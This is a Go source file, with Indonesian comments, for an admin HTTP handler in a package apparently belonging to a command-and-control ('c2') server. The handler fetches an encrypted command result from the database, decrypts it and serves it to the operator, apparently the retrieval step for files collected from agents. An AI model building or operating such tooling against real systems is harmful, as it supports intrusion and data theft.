package admin

import (
	"c2/database"
	"c2/utils"
	"net/http"
	"os"
	"path/filepath"

	"github.com/gorilla/mux"
)

// DownloadFile mengunduh file yang terenkripsi dan mengirimkan file terdekripsi ke admin
func DownloadFile(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	commandID := vars["command_id"]

	// Cari file hasil yang terenskripsi di database
	db := database.Connect()
	defer db.Close()

	var result string
	err := db.QueryRow(`
		SELECT result FROM commands WHERE id = ?`, commandID).Scan(&result)
	if err != nil {
		utils.LogError("Failed to get command result path: " + err.Error())
		http.Error(w, "Failed to get command result", http.StatusInternalServerError)
		return
	}

	// Pastikan hasilnya ada
	if result == "" {
		http.Error(w, "No result found", http.StatusNotFound)
		return
	}

	// Dekripsi file yang terenkripsi
	encryptedFile, err := os.ReadFile(result) // membaca file terenkripsi
	if err != nil {
		utils.LogError("Failed to read encrypted file: " + err.Error())
		http.Error(w, "Failed to read encrypted file", http.StatusInternalServerError)
		return
	}

	// Ambil nonce yang digunakan pada enkripsi sebelumnya
	nonce, err := utils.DecodeNonce(r.URL.Query().Get("nonce"))
	if err != nil {
		utils.LogError("Invalid nonce: " + err.Error())
		http.Error(w, "Invalid nonce", http.StatusBadRequest)
		return
	}

	// Dekripsi konten file
	decryptedContent, err := utils.DecryptFile(encryptedFile, nonce)
	if err != nil {
		utils.LogError("Failed to decrypt file: " + err.Error())
		http.Error(w, "Failed to decrypt file", http.StatusInternalServerError)
		return
	}

	// Tentukan header untuk respons file
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", "attachment; filename=\""+filepath.Base(result)+"\"")
	w.Write(decryptedContent) // kirimkan file yang sudah didekripsi
	utils.LogInfo("File decrypted and sent to admin for command: " + commandID)
}
